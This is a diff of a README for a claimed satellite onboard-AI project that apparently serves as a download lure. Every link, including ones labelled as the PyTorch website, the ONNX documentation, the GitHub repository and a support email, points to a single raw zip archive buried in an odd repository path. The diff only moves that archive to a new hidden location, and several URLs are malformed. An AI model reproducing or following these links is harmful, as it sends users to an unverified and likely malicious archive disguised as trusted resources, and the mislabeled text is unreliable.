@@ -1,7 +1,7 @@
 # 🌌 phisat2-trustworthy-onboard-ai - Reliable AI for Satellite Data Processing
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip%20Latest%https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)
+[![Download](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip%20Latest%https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the phisat2-trustworthy-onboard-ai project. This application helps you process satellite data using advanced onboard AI techniques. It is built with PyTorch and can convert models to ONNX for efficient processing. You will find features like calibration, telemetry, and a demo for the PhiSat-2 Earth Observation tiles.
@@ -14,7 +14,7 @@ Before you start, ensure your system meets these requirements:
 - **Space**: Minimum of 1 GB free disk space.
 - **Dependencies**: 
   - Python 3.8 or later
-  - PyTorch (visit the [official PyTorch website](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip) for instructions)
+  - PyTorch (visit the [official PyTorch website](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip) for instructions)
   - ONNX and ONNX Runtime
 
 ## 🔍 Features
@@ -24,7 +24,7 @@ Before you start, ensure your system meets these requirements:
 - **Demo Mode**: Explore the PhiSat-2 EO tile-filter functionality with ease.
 
 ## 📥 Download & Install
-To download the latest release of this application, visit this page: [Download Releases](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip).
+To download the latest release of this application, visit this page: [Download Releases](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip).
 
 1. Click the link to open the Releases page.
 2. You will see a list of available versions. Look for the latest stable release at the top.
@@ -69,19 +69,19 @@ If you encounter issues:
 For specific errors, refer to the application's documentation for detailed troubleshooting.
 
 ## 📞 Support
-If you have questions or need assistance, please email the support team at https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip
+If you have questions or need assistance, please email the support team at https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip
 
 ## 📚 Learn More
 For more information about the technologies used, check out these resources:
 
-- [PyTorch Documentation](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)
-- [ONNX Documentation](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)
-- [PhiSat-2 Project](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)
+- [ONNX Documentation](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)
+- [PhiSat-2 Project](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)
 
 ## 🌐 Connect with Us
 Stay updated on our latest news:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/.vscode/phisat2-trustworthy-onboard-ai_v2.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Abdelrahmanhatem2020/phisat2-trustworthy-onboard-ai/main/examples/phi2-eo-tile-filter/src/models/phisat_trustworthy_ai_onboard_v3.2.zip)
 - [Twitter](#)
 - [LinkedIn](#)
 
